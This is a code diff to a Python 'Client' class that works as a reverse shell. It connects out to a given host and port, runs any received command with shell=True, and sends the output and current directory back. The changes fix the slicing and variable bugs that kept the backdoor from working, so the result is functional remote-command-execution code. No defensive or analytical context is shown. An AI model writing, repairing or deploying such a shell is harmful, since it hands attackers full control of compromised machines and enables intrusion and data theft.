@@ -22,22 +22,20 @@ class Client:
     def __init__(self, host, port):
         self.host = host
         self.port = port
-        self.data = ""
-        self.cmd = ""
 
         self.socket = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
         self.socket.connect((self.host, self.port))
 
     def communicate_with_server(self):
         while True:
-            self.data = self.socket.recv(65535)
-            if self.data[:2].decode("utf-8") == "cd":
-                decoded_data = data[:3].decode("utf-8")
+            data = self.socket.recv(65535)
+            if data[:2].decode("utf-8") == "cd":
+                decoded_data = data[3:].decode("utf-8")
                 decoded_path = os.path.expanduser(decoded_data)
                 os.chdir(decoded_path)
-            if len(self.data) > 0:
-                self.cmd = subprocess.Popen(self.data[:].decode("utf-8"), shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                out_bytes = self.cmd.stdout.read() + self.cmd.stderr.read()
+            if len(data) > 0:
+                cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                out_bytes = cmd.stdout.read() + cmd.stderr.read()
                 out_str = str(out_bytes, "utf-8")
                 self.socket.send(str.encode(out_str + str(os.getcwd()) + '> '))
 
